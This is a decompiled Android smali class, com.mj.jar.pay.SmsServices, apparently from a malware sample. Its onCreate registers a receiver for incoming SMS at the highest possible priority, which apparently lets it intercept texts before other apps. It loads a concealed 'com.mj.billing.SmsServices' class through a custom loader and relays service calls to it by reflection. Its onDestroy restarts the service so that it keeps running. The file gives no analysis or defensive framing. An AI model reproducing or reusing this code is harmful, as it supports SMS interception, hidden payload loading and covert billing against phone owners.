.class public Lcom/mj/jar/pay/SmsServices;
.super Landroid/app/Service;


# instance fields
.field private a:Lcom/mj/jar/pay/InSmsReceiver;

.field private b:Ljava/lang/Class;

.field private c:Ljava/lang/Object;


# direct methods
.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lcom/mj/jar/pay/InSmsReceiver;

    invoke-direct {v0}, Lcom/mj/jar/pay/InSmsReceiver;-><init>()V

    iput-object v0, p0, Lcom/mj/jar/pay/SmsServices;->a:Lcom/mj/jar/pay/InSmsReceiver;

    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 5

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    if-eqz v0, :cond_0

    :try_start_0
    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    const-string v1, "onBind"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/content/Intent;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/IBinder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public onCreate()V
    .locals 5

    const/4 v2, 0x0

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->a:Lcom/mj/jar/pay/InSmsReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/mj/jar/pay/SmsServices;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    if-nez v0, :cond_1

    :cond_0
    iput-object v2, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    iput-object v2, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    :try_start_0
    sget-object v0, Lcom/mj/jar/pay/c;->b:Ljava/lang/String;

    invoke-static {p0, v0}, Lcom/mj/jar/pay/b;->a(Landroid/content/Context;Ljava/lang/String;)Lcom/mj/jar/pay/b;

    move-result-object v0

    const-string v1, "com.mj.billing.SmsServices"

    invoke-virtual {v0, v1}, Lcom/mj/jar/pay/b;->a(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    iput-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v0

    iput-object v0, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    if-eqz v0, :cond_2

    :try_start_1
    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    const-string v1, "onCreate"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/app/Service;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p0, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_2
    :goto_1
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 3

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    if-eqz v0, :cond_0

    :try_start_0
    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    const-string v1, "onDestroy"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-class v1, Lcom/mj/jar/pay/SmsServices;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/mj/jar/pay/SmsServices;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 5

    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    if-eqz v0, :cond_0

    :try_start_0
    iget-object v0, p0, Lcom/mj/jar/pay/SmsServices;->b:Ljava/lang/Class;

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/Class;

    const/4 v2, 0x0

    const-class v3, Landroid/app/Service;

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-class v3, Landroid/content/Intent;

    aput-object v3, v1, v2

    const/4 v2, 0x2

    sget-object v3, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v3, v1, v2

    const-string v2, "onStart"

    invoke-virtual {v0, v2, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->c:Ljava/lang/Object;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p0, v2, v3

    const/4 v3, 0x1

    aput-object p1, v2, v3

    const/4 v3, 0x2

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 v0, 0x1

    invoke-super {p0, p1, v0, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
